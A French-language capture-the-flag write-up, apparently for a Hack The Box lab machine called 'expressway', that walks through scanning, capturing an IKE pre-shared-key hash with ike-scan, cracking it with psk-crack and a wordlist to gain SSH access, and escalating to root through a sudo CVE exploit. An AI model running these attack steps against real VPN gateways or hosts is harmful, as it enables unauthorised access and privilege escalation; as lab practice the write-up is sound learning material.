@@ -1,0 +1,49 @@
+Sur nmap, seulement le port 22 était ouvert, après avoir testé quelques combinaisons attendues de mdp je teste de scan les ports UDP et je tombes sur le port 500/udp ouvert
+je teste donc:
+https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html
+
+─$ ike-scan -M 10.10.11.87                                                                                           
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Main Mode Handshake returned
+        HDR=(CKY-R=e51b940c43ffc0a6)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.036 seconds (28.02 hosts/sec).  1 returned handshake; 0 returned notify
+
+Hacktricks me dit:
+As you can see in the previous response, there is a field called AUTH with the value PSK. This means that the vpn is configured using a preshared key (and this is really good for a pentester).
+The value of the last line is also very important:
+1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output).
+
+en faisant 
+
+ike-scan -M -A -P --pskcrack=hash.txt 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned
+        HDR=(CKY-R=b9757adc097a4ea7)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.041 seconds (24.51 hosts/sec).  1 returned handshake; 0 returned notify
+
+je récupere un hash pour l'user ike
+psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 1f72202cf2a9031e53c154a2b9fc65add28c4c4f
+Ending psk-crack: 8045040 iterations in 4.936 seconds (1629774.26 iterations/sec)
+
+ça me permet d'avoir l'accès en ssh et le user flag avec ike:freakingrockstarontheroad
+
+En checkant la version de sudo je me rends compte qu'elle est vulnerable a un CVE-2025-32463 (img: sc/sudo.jpg) j'utilise donc cet exploit https://github.com/kh4sh3i/CVE-2025-32463
+ça fonctionne, j'ai le flag dans /root/root.txt
+FINIS!
+
+Comme le titre de la box l'indique (expressway), c'était assez direct et simple
